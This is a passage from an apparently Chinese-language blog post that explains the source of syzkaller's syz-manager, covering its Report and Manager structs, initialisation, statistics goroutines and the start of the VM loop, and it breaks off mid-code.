class="line">Report []<span class="keyword">byte</span></span><br><span class="line"><span class="comment">// Output contains whole raw console output as passed to Reporter.Parse.</span></span><br><span class="line">Output []<span class="keyword">byte</span></span><br><span class="line"><span class="comment">// StartPos/EndPos denote region of output with oops message(s).</span></span><br><span class="line">StartPos <span class="keyword">int</span></span><br><span class="line">EndPos   <span class="keyword">int</span></span><br><span class="line"><span class="comment">// SkipPos is position in output where parsing for the next report should start.</span></span><br><span class="line">SkipPos <span class="keyword">int</span></span><br><span class="line"><span class="comment">// Suppressed indicates whether the report should not be reported to user.</span></span><br><span class="line">Suppressed <span class="keyword">bool</span></span><br><span class="line"><span class="comment">// Corrupted indicates whether the report is truncated of corrupted in some other way.</span></span><br><span class="line">Corrupted <span class="keyword">bool</span></span><br><span class="line"><span class="comment">// CorruptedReason contains reason why the report is marked as corrupted.</span></span><br><span class="line">CorruptedReason <span class="keyword">string</span></span><br><span class="line"><span class="comment">// Recipients is a list of RecipientInfo with Email, Display Name, and type.</span></span><br><span class="line">Recipients vcs.Recipients</span><br><span class="line"><span class="comment">// GuiltyFile is the source file that we think is to blame for the crash  (filled in by Symbolize).</span></span><br><span class="line">GuiltyFile <span class="keyword">string</span></span><br><span class="line"><span class="comment">// reportPrefixLen is length of additional prefix lines that we added before actual crash report.</span></span><br><span class="line">reportPrefixLen <span class="keyword">int</span></span><br><span class="line"><span class="comment">// symbolized is set if the report is symbolized.</span></span><br><span class="line">symbolized <span class="keyword">bool</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Report</code>结构体用来表示单次执行的结果，包括是否产生了<code>crash</code>、<code>Oops</code>的信息等等。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">mgr := &amp;Manager&#123;</span><br><span class="line">  cfg:              cfg,</span><br><span class="line">  vmPool:           vmPool,</span><br><span class="line">  target:           cfg.Target,</span><br><span class="line">  sysTarget:        cfg.SysTarget,</span><br><span class="line">  reporter:         reporter,</span><br><span class="line">  crashdir:         crashdir,</span><br><span class="line">  startTime:        time.Now(),</span><br><span class="line">  stats:            &amp;Stats&#123;haveHub: cfg.HubClient != <span class="string">&quot;&quot;</span>&#125;,</span><br><span class="line">  crashTypes:       <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">bool</span>),</span><br><span class="line">  corpus:           <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]CorpusItem),</span><br><span class="line">  disabledHashes:   <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">struct</span>&#123;&#125;),</span><br><span class="line">  memoryLeakFrames: <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">bool</span>),</span><br><span class="line">  dataRaceFrames:   <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">bool</span>),</span><br><span class="line">  fresh:            <span class="literal">true</span>,</span><br><span class="line">  vmStop:           <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">bool</span>),</span><br><span class="line">  hubReproQueue:    <span class="built_in">make</span>(<span class="keyword">chan</span> *Crash, <span class="number">10</span>),</span><br><span class="line">  needMoreRepros:   <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">chan</span> <span class="keyword">bool</span>),</span><br><span class="line">  reproRequest:     <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">chan</span> <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">bool</span>),</span><br><span class="line">  usedFiles:        <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]time.Time),</span><br><span class="line">  saturatedCalls:   <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">bool</span>),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mgr.preloadCorpus()</span><br><span class="line">mgr.initStats() <span class="comment">// Initializes prometheus variables.</span></span><br><span class="line">mgr.initHTTP()  <span class="comment">// Creates HTTP server.</span></span><br><span class="line">mgr.collectUsedFiles()</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create RPC server for fuzzers.</span></span><br><span class="line">mgr.serv, err = startRPCServer(mgr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">  log.Fatalf(<span class="string">&quot;failed to create rpc server: %v&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> cfg.DashboardAddr != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">  mgr.dash, err = dashapi.New(cfg.DashboardClient, cfg.DashboardAddr, cfg.DashboardKey)</span><br><span class="line">  <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    log.Fatalf(<span class="string">&quot;failed to create dashapi connection: %v&quot;</span>, err)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> !cfg.AssetStorage.IsEmpty() &#123;</span><br><span class="line">  mgr.assetStorage, err = asset.StorageFromConfig(cfg.AssetStorage, mgr.dash)</span><br><span class="line">  <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    log.Fatalf(<span class="string">&quot;failed to init asset storage: %v&quot;</span>, err)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟着函数流程往下走，首先这里会创建一个<code>Manager</code>实例，然后下面四个函数的作用分别是:</p><p><code>mgr.preloadCorpus()</code>: 检查 <code>corpus.db</code> 文件是否存在（若不存在则创建）并载入 <code>sys/linux/test</code> 目录下的测试用模板</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># Create an io_uring instance</span><br><span class="line">r0 = syz_io_uring_setup(<span class="number">0xF00</span>, &amp;AUTO=&#123;<span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="string">&quot;000000000000000000000000&quot;</span>, [<span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>], [<span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>]&#125;, &amp;AUTO=&lt;r1=&gt;<span class="number">0x0</span>, &amp;AUTO=&lt;r2=&gt;<span class="number">0x0</span>)</span><br><span class="line"># Set IORING_CQ_EVENTFD_DISABLED. Has no side-effect <span class="keyword">for</span> the test,</span><br><span class="line"><span class="meta"># only tests syz_memcpy_off().</span></span><br><span class="line">syz_memcpy_off$IO_URING_METADATA_FLAGS(r1, <span class="number">0x114</span>, &amp;AUTO=<span class="number">0x1</span>, <span class="number">0x0</span>, AUTO)</span><br><span class="line"># Write an openat2 operation to the submission <span class="built_in">queue</span></span><br><span class="line">syz_io_uring_submit(r1, r2, &amp;AUTO=@IORING_OP_OPENAT2=&#123;AUTO, <span class="number">0x0</span>, AUTO, <span class="number">0xffffffffffffff9c</span>, &amp;AUTO=&#123;<span class="number">0x42</span>, <span class="number">0x0</span>, <span class="number">0x0</span>&#125;, &amp;AUTO=<span class="string">&#x27;./file1\x00&#x27;</span>, AUTO, AUTO, <span class="number">0x12345</span>, &#123;AUTO, <span class="number">0x0</span>, <span class="string">&quot;0000000000000000000000000000000000000000&quot;</span>&#125;&#125;)</span><br><span class="line"># Notify the kernel about the submission <span class="keyword">and</span> wait until completion</span><br><span class="line">io_uring_enter(r0, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x0</span>)</span><br><span class="line"># Get the resulting fd from the completion <span class="built_in">queue</span></span><br><span class="line">r3 = syz_io_uring_complete(r1)</span><br><span class="line"># Close the file</span><br><span class="line">close(r3)</span><br></pre></td></tr></table></figure><p>如上是<code>sys/linux/test/io_uring</code>模板</p><p><code>mgr.initStates()</code>: 注册一个 prometheus 监视器（一个开源的监视&amp;预警工具包）</p><p> <code>mgr.initHTTP()</code>: 创建一个 HTTP 服务器并注册一系列的目录</p><p><code>mgr.collectUsedFiles()</code>: 检查所需文件是否存在</p><p>随后通过<code>startRPCServer</code>函数创建一个<code>RPC</code>服务器，该服务器用于Host与<code>Guest VMs</code>进行通信。最后初始化<code>dashboard</code>相关内容。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Manager <span class="keyword">struct</span> &#123;</span><br><span class="line">cfg            *mgrconfig.Config</span><br><span class="line">vmPool         *vm.Pool</span><br><span class="line">target         *prog.Target</span><br><span class="line">sysTarget      *targets.Target</span><br><span class="line">reporter       *report.Reporter</span><br><span class="line">crashdir       <span class="keyword">string</span></span><br><span class="line">serv           *RPCServer</span><br><span class="line">corpusDB       *db.DB</span><br><span class="line">startTime      time.Time</span><br><span class="line">firstConnect   time.Time</span><br><span class="line">fuzzingTime    time.Duration</span><br><span class="line">stats          *Stats</span><br><span class="line">crashTypes     <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">bool</span></span><br><span class="line">vmStop         <span class="keyword">chan</span> <span class="keyword">bool</span></span><br><span class="line">checkResult    *rpctype.CheckArgs</span><br><span class="line">fresh          <span class="keyword">bool</span></span><br><span class="line">numFuzzing     <span class="keyword">uint32</span></span><br><span class="line">numReproducing <span class="keyword">uint32</span></span><br><span class="line"></span><br><span class="line">dash *dashapi.Dashboard</span><br><span class="line"></span><br><span class="line">mu                    sync.Mutex</span><br><span class="line">phase                 <span class="keyword">int</span></span><br><span class="line">targetEnabledSyscalls <span class="keyword">map</span>[*prog.Syscall]<span class="keyword">bool</span></span><br><span class="line"></span><br><span class="line">candidates       []rpctype.Candidate <span class="comment">// untriaged inputs from corpus and hub</span></span><br><span class="line">disabledHashes   <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">struct</span>&#123;&#125;</span><br><span class="line">corpus           <span class="keyword">map</span>[<span class="keyword">string</span>]CorpusItem</span><br><span class="line">seeds            [][]<span class="keyword">byte</span></span><br><span class="line">newRepros        [][]<span class="keyword">byte</span></span><br><span class="line">lastMinCorpus    <span class="keyword">int</span></span><br><span class="line">memoryLeakFrames <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">bool</span></span><br><span class="line">dataRaceFrames   <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">bool</span></span><br><span class="line">saturatedCalls   <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">bool</span></span><br><span class="line"></span><br><span class="line">needMoreRepros <span class="keyword">chan</span> <span class="keyword">chan</span> <span class="keyword">bool</span></span><br><span class="line">hubReproQueue  <span class="keyword">chan</span> *Crash</span><br><span class="line">reproRequest   <span class="keyword">chan</span> <span class="keyword">chan</span> <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">bool</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// For checking that files that we are using are not changing under us.</span></span><br><span class="line"><span class="comment">// Maps file name to modification time.</span></span><br><span class="line">usedFiles <span class="keyword">map</span>[<span class="keyword">string</span>]time.Time</span><br><span class="line"></span><br><span class="line">modules            []host.KernelModule</span><br><span class="line">coverFilter        <span class="keyword">map</span>[<span class="keyword">uint32</span>]<span class="keyword">uint32</span></span><br><span class="line">coverFilterBitmap  []<span class="keyword">byte</span></span><br><span class="line">modulesInitialized <span class="keyword">bool</span></span><br><span class="line"></span><br><span class="line">assetStorage *asset.Storage</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述就是<code>Manager</code>结构体，这里只说几个重要的成员：</p><ul><li><code>cfg</code>: 基本设置信息，存放在一个json文件中</li><li><code>vmPool</code>: 所用的<code>vm Pool</code></li><li><code>reporter</code>: 用以报告<code>crash</code></li><li><code>serv</code>: <code>RPC server</code>用于与<code>Guest VM</code>通信</li><li><code>corpusDB</code>: 用于存放语料的数据库</li><li><code>targetEnabledSyscalls</code>: 测试用例所允许使用的系统调用</li><li><code>candidates</code>: 待执行测试用例</li><li><code>corpus</code>: 语料库</li><li><code>seeds</code>: 用来对语料库变异的种子</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">  <span class="keyword">for</span> lastTime := time.Now(); ; &#123;</span><br><span class="line">    time.Sleep(<span class="number">10</span> * time.Second)</span><br><span class="line">    now := time.Now()</span><br><span class="line">    diff := now.Sub(lastTime)</span><br><span class="line">    lastTime = now</span><br><span class="line">    mgr.mu.Lock()</span><br><span class="line">    <span class="keyword">if</span> mgr.firstConnect.IsZero() &#123;</span><br><span class="line">      mgr.mu.Unlock()</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">    &#125;</span><br><span class="line">    mgr.fuzzingTime += diff * time.Duration(atomic.LoadUint32(&amp;mgr.numFuzzing))</span><br><span class="line">    executed := mgr.stats.execTotal.get()</span><br><span class="line">    crashes := mgr.stats.crashes.get()</span><br><span class="line">    corpusCover := mgr.stats.corpusCover.get()</span><br><span class="line">    corpusSignal := mgr.stats.corpusSignal.get()</span><br><span class="line">    maxSignal := mgr.stats.maxSignal.get()</span><br><span class="line">    triageQLen := <span class="built_in">len</span>(mgr.candidates)</span><br><span class="line">    mgr.mu.Unlock()</span><br><span class="line">    numReproducing := atomic.LoadUint32(&amp;mgr.numReproducing)</span><br><span class="line">    numFuzzing := atomic.LoadUint32(&amp;mgr.numFuzzing)</span><br><span class="line"></span><br><span class="line">    log.Logf(<span class="number">0</span>, <span class="string">&quot;VMs %v, executed %v, cover %v, signal %v/%v, crashes %v, repro %v, triageQLen %v&quot;</span>,</span><br><span class="line">             numFuzzing, executed, corpusCover, corpusSignal, maxSignal, crashes, numReproducing, triageQLen)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;()</span><br></pre></td></tr></table></figure><p>这里会新起一个写成进行数据记录的工作，函数内部就是一个for循环并且没有停止的，其作用就是每隔十秒进行一次进度采集并输出日志，主要是采集执行信息、语料覆盖率、crashes 信息等。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> *flagBench != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">  mgr.initBench()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> mgr.dash != <span class="literal">nil</span> &#123;</span><br><span class="line">  <span class="keyword">go</span> mgr.dashboardReporter()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">osutil.HandleInterrupts(vm.Shutdown)</span><br><span class="line"><span class="keyword">if</span> mgr.vmPool == <span class="literal">nil</span> &#123;</span><br><span class="line">  log.Logf(<span class="number">0</span>, <span class="string">&quot;no VMs started (type=none)&quot;</span>)</span><br><span class="line">  log.Logf(<span class="number">0</span>, <span class="string">&quot;you are supposed to start syz-fuzzer manually as:&quot;</span>)</span><br><span class="line">  log.Logf(<span class="number">0</span>, <span class="string">&quot;syz-fuzzer -manager=manager.ip:%v [other flags as necessary]&quot;</span>, mgr.serv.port)</span><br><span class="line">  &lt;-vm.Shutdown</span><br><span class="line">  <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">mgr.vmLoop()</span><br></pre></td></tr></table></figure><p>首先，这里会先判断<code>flagBench</code>是否不为空字符串，如果不为空字符串则调用<code>initBench</code>函数。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> (</span><br><span class="line">flagConfig = flag.String(<span class="string">&quot;config&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;configuration file&quot;</span>)</span><br><span class="line">flagDebug  = flag.Bool(<span class="string">&quot;debug&quot;</span>, <span class="literal">false</span>, <span class="string">&quot;dump all VM output to console&quot;</span>)</span><br><span class="line">flagBench  = flag.String(<span class="string">&quot;bench&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;write execution statistics into this file periodically&quot;</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>这里的<code>flagBench</code>是一个全局变量，使用的是<code>golang</code>的flag包解析命令行。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(mgr *Manager)</span> <span class="title">initBench</span><span class="params">()</span></span> &#123;</span><br><span class="line">f, err := os.OpenFile(*flagBench, os.O_WRONLY|os.O_CREATE|os.O_EXCL, osutil.DefaultFilePerm)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalf(<span class="string">&quot;failed to open bench file: %v&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">time.Sleep(time.Minute)</span><br><span class="line">vals := mgr.stats.all()</span><br><span class="line">mgr.mu.Lock()</span><br><span class="line"><span class="keyword">if</span> mgr.firstConnect.IsZero() &#123;</span><br><span class="line">mgr.mu.Unlock()</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">mgr.minimizeCorpus()</span><br><span class="line">vals[<span class="string">&quot;corpus&quot;</span>] = <span class="keyword">uint64</span>(<span class="built_in">len</span>(mgr.corpus))</span><br><span class="line">vals[<span class="string">&quot;uptime&quot;</span>] = <span class="keyword">uint64</span>(time.Since(mgr.firstConnect)) / <span class="number">1e9</span></span><br><span class="line">vals[<span class="string">&quot;fuzzing&quot;</span>] = <span class="keyword">uint64</span>(mgr.fuzzingTime) / <span class="number">1e9</span></span><br><span class="line">vals[<span class="string">&quot;candidates&quot;</span>] = <span class="keyword">uint64</span>(<span class="built_in">len</span>(mgr.candidates))</span><br><span class="line">mgr.mu.Unlock()</span><br><span class="line"></span><br><span class="line">data, err := json.MarshalIndent(vals, <span class="string">&quot;&quot;</span>, <span class="string">&quot;  &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalf(<span class="string">&quot;failed to serialize bench data&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> _, err := f.Write(<span class="built_in">append</span>(data, <span class="string">&#x27;\n&#x27;</span>)); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalf(<span class="string">&quot;failed to write bench data&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>initBench</code>会启动一个协程，这个协程会每隔一分钟循环一次，其主要功能是调用<code>minimizeCorpus</code>将语料库进行最小化，想<code>bench</code>参数指定的文件写入语料库长度、启动时间、fuzzing 时间。</p><p>回到<code>RunManager</code>函数中，接下来又会调用<code>dashboardReporter</code>启动一个新的协程，这里的作用就是每隔一分钟上报一次<code>syz-manager</code>的状态。</p><p>最后检查一下<code>VM Pool</code>并调用<code>vmloop</code>函数。</p><h2 id="vmloop函数"><a href="#vmloop函数" class="headerlink" title="vmloop函数"></a>vmloop函数</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Manager needs to be refactored (#605).</span></span><br><span class="line"><span class="comment">// nolint: gocyclo, gocognit, funlen</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(mgr *Manager)</span> <span class="title">vmLoop</span><span class="params">()</span></span> &#123;</span><br><span class="line">log.Logf(<span class="number">0</span>, <span class="string">&quot;booting test machines...&quot;</span>)</span><br><span class="line">log.Logf(<span class="number">0</span>, <span class="string">&quot;wait for the connection from test machine...&quot;</span>)</span><br><span class="line">instancesPerRepro := <span class="number">3</span></span><br><span class="line">vmCount := mgr.vmPool.Count()</span><br><span class="line">maxReproVMs := vmCount - mgr.cfg.FuzzingVMs</span><br><span class="line"><span class="keyword">if</span> instancesPerRepro &gt; maxReproVMs &amp;&amp; maxReproVMs &gt; <span class="number">0</span> &#123;</span><br><span class="line">instancesPerRepro = maxReproVMs</span><br><span class="line">&#125;</span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数首先对VM进行分组，一共分为两组，一组负责<code>fuzzing</code>，一组负责复现<code>crash</code>( maxReproVMs )。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">instances := SequentialResourcePool(vmCount, <span class="number">10</span>*time.Second*mgr.cfg.Timeouts.Scale)</span><br><span class="line">runDone := <span class="built_in">make</span>(<span class="keyword">chan</span> *RunResult, <span class="number">1</span>)</span><br><span class="line">pendingRepro := <span class="built_in">make</span>(<span class="keyword">map</span>[*Crash]<span class="keyword">bool</span>)</span><br><span class="line">reproducing := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">bool</span>)</span><br><span class="line"><span class="keyword">var</span> reproQueue []*Crash</span><br><span class="line">reproDone := <span class="built_in">make</span>(<span class="keyword">chan</span> *ReproResult, <span class="number">1</span>)</span><br><span class="line">stopPending := <span class="literal">false</span></span><br><span class="line">shutdown := vm.Shutdown</span><br></pre></td></tr></table></figure><p>接着会调用<code>SequentialResourcePool</code>函数新建一个<code>ResourcePool</code>队列，主要负责对空闲的VM的使用顺序进行调控。</p><p>随后会初始化一系列的变量：</p><ul><li><code>runDone</code>：保存 fuzzing 结果为 crash 的 Crash 队列</li><li><code>pendingRepro</code>：标识待复现的 Crash</li><li><code>reproducing</code>：标识某个类型 Crash 是否准备被复现</li><li><code>reproQueue</code>：Crash 的复现队列</li><li><code>reproDone</code>：Crash 的复现结果</li><li><code>stopPending</code>：等待停止标志位</li><li><code>shutdown</code>：工作终止标志位</li></ul><p>最后进入到一个大循环中，而这个大循环才是真正意义上的<code>fuzzing</code>调控流程。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> shutdown != <span class="literal">nil</span> || instances.Len() != vmCount &#123;</span><br><span class="line">mgr.mu.Lock()</span><br><span class="line">phase := mgr.phase</span><br><span class="line">mgr.mu.Unlock()</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大循环终止循环的条件是<code>shutdown != nil</code>或者<code>ResourcePool</code>中的VM数量与总数量不相等，进入循环后首先做的事就是获取当前所进行的阶段。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> crash := <span class="keyword">range</span> pendingRepro &#123;</span><br><span class="line">  <span class="keyword">if</span> reproducing[crash.Title] &#123;</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">delete</span>(pendingRepro, crash)</span><br><span class="line">  <span class="keyword">if</span> !mgr.needRepro(crash) &#123;</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line">  &#125;</span><br><span class="line">  log.Logf(<span class="number">1</span>, <span class="string">&quot;loop: add to repro queue &#x27;%v&#x27;&quot;</span>, crash.Title)</span><br><span class="line">  reproducing[crash.Title] = <span class="literal">true</span></span><br><span class="line">  reproQueue = <span class="built_in">append</span>(reproQueue, crash)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>紧接着进入到内层小循环，这里会遍历<code>reproducing</code>中的<code>crash</code>，如果没有被复现过则从<code>pendingRepro</code>中删除，随后调用<code>mgr.needRepro</code>来看<code>crash</code>是否需要被复现，后面标记该标题的<code>crash</code>为已复现，最后加入到复现的队列中。</p><p>这里的<code>crash.Title</code>为Oops的第一行文本，从上面的逻辑可以看出来，一次只能复现同类<code>crash</code>中的一个。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">log.Logf(<span class="number">1</span>, <span class="string">&quot;loop: phase=%v shutdown=%v instances=%v/%v %+v repro: pending=%v reproducing=%v 